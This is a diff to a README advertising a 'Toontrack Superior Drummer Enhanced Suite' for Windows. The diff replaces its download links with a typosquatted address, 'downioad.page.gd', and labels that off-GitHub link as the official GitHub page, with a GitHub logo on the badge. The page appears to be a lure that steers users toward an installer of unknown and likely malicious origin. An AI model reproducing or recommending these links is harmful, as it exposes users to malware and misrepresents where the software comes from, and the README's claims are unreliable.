@@ -2,7 +2,7 @@
 
 Welcome to the Toontrack Superior Drummer Enhanced Suite, a powerful tool designed to elevate your drum production experience on Windows. This suite offers advanced features for MIDI groove management, mixer customization, and expansion pack organization, all optimized for Superior Drummer.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -63,6 +63,6 @@ A: Updates are delivered automatically through the application's settings menu, 
 
 To get started, download the latest version of the Toontrack Superior Drummer Enhanced Suite from the official GitHub page. This ensures you have the most recent features and security updates.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 **Last Updated**: January 2026. For support or inquiries, please refer to the documentation included with the installer.
